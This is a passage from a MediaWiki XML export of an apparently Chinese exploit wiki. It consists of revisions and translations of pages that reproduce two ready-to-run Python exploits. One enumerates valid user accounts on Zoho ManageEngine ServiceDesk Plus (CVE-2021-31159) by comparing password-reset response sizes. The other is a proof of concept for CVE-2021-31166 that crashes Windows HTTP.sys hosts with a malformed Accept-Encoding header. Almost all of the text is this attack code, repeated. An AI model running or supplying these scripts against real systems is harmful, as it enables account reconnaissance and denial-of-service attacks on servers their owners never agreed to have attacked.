			resp = s.get(url+"/ForgotPassword.sd?userName="+u+"&amp;dname="+domain, verify = False) 
			valid = (len(resp.content) != incorrect_size)
			if valid:
				correct_users.append(u)
			print("User: %s Response size: %s (correct: %s)"%(u, len(resp.content),str(valid)))

	print("\nCorrect users\n")
	with open(outputfile, 'w') as f:
		for user in correct_users:
			f.write("%s\n" % user)
			print("- %s"%(user))

	print("\nResults stored in %s\n"%(outputfile))


if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>nwemk2ho72umoob3zb7cqigvpqh1dm4</sha1>
    </revision>
    <revision>
      <id>5284</id>
      <parentid>5283</parentid>
      <timestamp>2021-06-18T02:55:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5284</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2360" sha1="szs6i8wfc5k31qvkwvk2v946ml4xzlv" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Zoho ManageEngine ServiceDesk Plus 9.4

==EXP==
&lt;pre&gt;
# Exploit Title: Zoho ManageEngine ServiceDesk Plus MSP 9.4 - User Enumeration 
# Date: 17/06/2021
# Exploit Author: Ricardo Ruiz (@ricardojoserf)
# CVE: CVE-2021-31159 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31159)
# Vendor Homepage: https://www.manageengine.com
# Vendor Confirmation: https://www.manageengine.com/products/service-desk-msp/readme.html#10519
# Version: Previous to build 10519
# Tested on: Zoho ManageEngine ServiceDesk Plus 9.4
# Example: python3 exploit.py -t http://example.com/ -d DOMAIN -u USERSFILE [-o OUTPUTFILE]
# Repository (for updates and fixing bugs): https://github.com/ricardojoserf/CVE-2021-31159

import argparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-d', '--domain', required=True, action='store', help='Domain to attack')
	parser.add_argument('-t', '--target', required=True, action='store', help='Target Url to attack')
	parser.add_argument('-u', '--usersfile', required=True, action='store', help='Users file')	
	parser.add_argument('-o', '--outputfile', required=False, default="listed_users.txt", action='store', help='Output file')
	my_args = parser.parse_args()
	return my_args


def main():
	args = get_args()
	url = args.target
	domain = args.domain
	usersfile = args.usersfile
	outputfile = args.outputfile

	s = requests.session()
	s.get(url)
	resp_incorrect = s.get(url+"/ForgotPassword.sd?userName="+"nonexistentuserforsure"+"&amp;dname="+domain, verify = False)
	incorrect_size = len(resp_incorrect.content)
	print("Incorrect size: %s"%(incorrect_size))

	correct_users = []
	users = open(usersfile).read().splitlines()
	for u in users:
			resp = s.get(url+"/ForgotPassword.sd?userName="+u+"&amp;dname="+domain, verify = False) 
			valid = (len(resp.content) != incorrect_size)
			if valid:
				correct_users.append(u)
			print("User: %s Response size: %s (correct: %s)"%(u, len(resp.content),str(valid)))

	print("\nCorrect users\n")
	with open(outputfile, 'w') as f:
		for user in correct_users:
			f.write("%s\n" % user)
			print("- %s"%(user))

	print("\nResults stored in %s\n"%(outputfile))


if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>szs6i8wfc5k31qvkwvk2v946ml4xzlv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31159 Zoho ManageEngine ServiceDesk Plus MSP 9.4 用戶枚舉漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4598</id>
    <revision>
      <id>5289</id>
      <timestamp>2021-06-18T02:57:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>5289</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2324" sha1="s96widau6vws5juw8ls1zdmg83w4pnf" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
Zoho ManageEngine ServiceDesk Plus 9.4

==EXP==
&lt;pre&gt;
# Exploit Title: Zoho ManageEngine ServiceDesk Plus MSP 9.4 - User Enumeration 
# Date: 17/06/2021
# Exploit Author: Ricardo Ruiz (@ricardojoserf)
# CVE: CVE-2021-31159 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31159)
# Vendor Homepage: https://www.manageengine.com
# Vendor Confirmation: https://www.manageengine.com/products/service-desk-msp/readme.html#10519
# Version: Previous to build 10519
# Tested on: Zoho ManageEngine ServiceDesk Plus 9.4
# Example: python3 exploit.py -t http://example.com/ -d DOMAIN -u USERSFILE [-o OUTPUTFILE]
# Repository (for updates and fixing bugs): https://github.com/ricardojoserf/CVE-2021-31159

import argparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-d', '--domain', required=True, action='store', help='Domain to attack')
	parser.add_argument('-t', '--target', required=True, action='store', help='Target Url to attack')
	parser.add_argument('-u', '--usersfile', required=True, action='store', help='Users file')	
	parser.add_argument('-o', '--outputfile', required=False, default="listed_users.txt", action='store', help='Output file')
	my_args = parser.parse_args()
	return my_args


def main():
	args = get_args()
	url = args.target
	domain = args.domain
	usersfile = args.usersfile
	outputfile = args.outputfile

	s = requests.session()
	s.get(url)
	resp_incorrect = s.get(url+"/ForgotPassword.sd?userName="+"nonexistentuserforsure"+"&amp;dname="+domain, verify = False)
	incorrect_size = len(resp_incorrect.content)
	print("Incorrect size: %s"%(incorrect_size))

	correct_users = []
	users = open(usersfile).read().splitlines()
	for u in users:
			resp = s.get(url+"/ForgotPassword.sd?userName="+u+"&amp;dname="+domain, verify = False) 
			valid = (len(resp.content) != incorrect_size)
			if valid:
				correct_users.append(u)
			print("User: %s Response size: %s (correct: %s)"%(u, len(resp.content),str(valid)))

	print("\nCorrect users\n")
	with open(outputfile, 'w') as f:
		for user in correct_users:
			f.write("%s\n" % user)
			print("- %s"%(user))

	print("\nResults stored in %s\n"%(outputfile))


if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>s96widau6vws5juw8ls1zdmg83w4pnf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>2405</id>
    <revision>
      <id>2893</id>
      <timestamp>2021-05-18T01:34:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows..."</comment>
      <origin>2893</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="972" sha1="t9uk5ijyuoo1m1vesm0or01tvhdijol" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
&lt;translate&gt;
⚠️️執行該POC會出現藍屏。
&lt;/translate&gt;
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]</text>
      <sha1>t9uk5ijyuoo1m1vesm0or01tvhdijol</sha1>
    </revision>
    <revision>
      <id>2894</id>
      <parentid>2893</parentid>
      <timestamp>2021-05-18T01:35:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>2894</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1053" sha1="7i1v2sn5bbymzt62gu9k7008f6frx0h" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
&lt;translate&gt;
⚠️️執行該POC會出現藍屏。
&lt;/translate&gt;
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>7i1v2sn5bbymzt62gu9k7008f6frx0h</sha1>
    </revision>
    <revision>
      <id>2895</id>
      <parentid>2894</parentid>
      <timestamp>2021-05-18T01:36:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>2895</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1086" sha1="a4cwcwzt1oxvoz7zg7lezj6fkr4kclq" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
&lt;translate&gt;
&lt;!--T:2--&gt;
⚠️️執行該POC會出現藍屏。
&lt;/translate&gt;
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


&lt;translate&gt;
==參考== &lt;!--T:3--&gt;
&lt;/translate&gt;
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>a4cwcwzt1oxvoz7zg7lezj6fkr4kclq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/ar</title>
    <ns>0</ns>
    <id>2447</id>
    <revision>
      <id>2936</id>
      <timestamp>2021-05-18T01:47:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== تأثير الضعف =="</comment>
      <origin>2936</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1064" sha1="mo07p0z1d8bkutkutlhgcgotyqkfs92" xml:space="preserve">&lt;languages  /&gt;
== تأثير الضعف ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
ستظهر شاشة زرقاء عند تنفيذ POC.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>mo07p0z1d8bkutkutlhgcgotyqkfs92</sha1>
    </revision>
    <revision>
      <id>2937</id>
      <parentid>2936</parentid>
      <timestamp>2021-05-18T01:47:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "ستظهر شاشة زرقاء عند تنفيذ POC."</comment>
      <origin>2937</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1011" sha1="hf8yzkh8qxmyt9mk1j5fbpi6pmz02k5" xml:space="preserve">&lt;languages  /&gt;
== تأثير الضعف ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
ستظهر شاشة زرقاء عند تنفيذ POC.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== المرجع ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>hf8yzkh8qxmyt9mk1j5fbpi6pmz02k5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/de</title>
    <ns>0</ns>
    <id>2465</id>
    <revision>
      <id>2955</id>
      <timestamp>2021-05-18T01:52:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Auswirkungen auf die Sicherheitsanfälligkeit =="</comment>
      <origin>2955</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1056" sha1="9jppabknnxf6ubf3zmuqzp71q7tovez" xml:space="preserve">&lt;languages  /&gt;
== Auswirkungen auf die Sicherheitsanfälligkeit ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️ Ein blauer Bildschirm wird angezeigt, wenn der POC ausgeführt wird.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Referenz ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>9jppabknnxf6ubf3zmuqzp71q7tovez</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>2418</id>
    <revision>
      <id>2908</id>
      <timestamp>2021-05-18T01:38:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Reference=="</comment>
      <origin>2908</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1010" sha1="ma510odvhew6yoloer19hc87kp73t91" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability Impact==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️A blue screen will appear when the POC is executed.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


==Reference==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>ma510odvhew6yoloer19hc87kp73t91</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/es</title>
    <ns>0</ns>
    <id>2428</id>
    <revision>
      <id>2918</id>
      <timestamp>2021-05-18T01:40:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Impacto de la vulnerabilidad =="</comment>
      <origin>2918</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1026" sha1="lcniqn9uqdib7p2lt8kqtpqlpgypi1c" xml:space="preserve">&lt;languages  /&gt;
== Impacto de la vulnerabilidad ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️Aparecerá una pantalla azul cuando se ejecute el POC.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Referencia ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>lcniqn9uqdib7p2lt8kqtpqlpgypi1c</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/fr</title>
    <ns>0</ns>
    <id>2467</id>
    <revision>
      <id>2957</id>
      <timestamp>2021-05-18T01:55:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "⚠️️ Un écran bleu apparaîtra lorsque le POC est exécuté."</comment>
      <origin>2957</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1030" sha1="fhfcswvxscrc3nt60sz72yo4kengzm9" xml:space="preserve">&lt;languages  /&gt;
== Impact de la vulnérabilité ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️ Un écran bleu apparaîtra lorsque le POC est exécuté.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Référence ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>fhfcswvxscrc3nt60sz72yo4kengzm9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/he</title>
    <ns>0</ns>
    <id>2429</id>
    <revision>
      <id>2919</id>
      <timestamp>2021-05-18T01:42:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== הפניה =="</comment>
      <origin>2919</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1021" sha1="sikb437xh35n6wc6ltijllc4srtohc6" xml:space="preserve">&lt;languages  /&gt;
== השפעת פגיעות ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️ מסך כחול יופיע בעת ביצוע ה- POC.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== הפניה ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>sikb437xh35n6wc6ltijllc4srtohc6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/id</title>
    <ns>0</ns>
    <id>3079</id>
    <revision>
      <id>3580</id>
      <timestamp>2021-05-26T14:19:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-31166 Protokol HTTP tumpukan kerentanan eksekusi kode jarak jauh"</comment>
      <origin>3580</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1006" sha1="pme2ynm5ok7xkvg8vfzlyn77zto5uu9" xml:space="preserve">&lt;languages  /&gt;
== Dampak Kerentanan ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️ Layar biru akan muncul ketika POC dijalankan.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Referensi ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>pme2ynm5ok7xkvg8vfzlyn77zto5uu9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/ja</title>
    <ns>0</ns>
    <id>2469</id>
    <revision>
      <id>2959</id>
      <timestamp>2021-05-18T01:59:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==脆弱性への影響=="</comment>
      <origin>2959</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1026" sha1="qcl49837okh3b9scluhy119ezwg07su" xml:space="preserve">&lt;languages  /&gt;
==脆弱性への影響==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️POCを実行するとブルースクリーンが表示されます。
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


==参照==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>qcl49837okh3b9scluhy119ezwg07su</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/nl</title>
    <ns>0</ns>
    <id>2468</id>
    <revision>
      <id>2958</id>
      <timestamp>2021-05-18T01:56:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Impact op kwetsbaarheid =="</comment>
      <origin>2958</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1031" sha1="h3vewn0wya8j60we3s4zva8do3eoxx0" xml:space="preserve">&lt;languages  /&gt;
== Impact op kwetsbaarheid ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️ Er verschijnt een blauw scherm wanneer de POC wordt uitgevoerd.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Referentie ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>h3vewn0wya8j60we3s4zva8do3eoxx0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/pt</title>
    <ns>0</ns>
    <id>2466</id>
    <revision>
      <id>2956</id>
      <timestamp>2021-05-18T01:54:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Referência =="</comment>
      <origin>2956</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1023" sha1="5zw3gy7x1qecc5c9a9rang7oeuamsk4" xml:space="preserve">&lt;languages  /&gt;
== Impacto de vulnerabilidade ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️Uma tela azul aparecerá quando o POC for executado.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Referência ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>5zw3gy7x1qecc5c9a9rang7oeuamsk4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>2419</id>
    <revision>
      <id>2909</id>
      <timestamp>2021-05-18T01:38:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
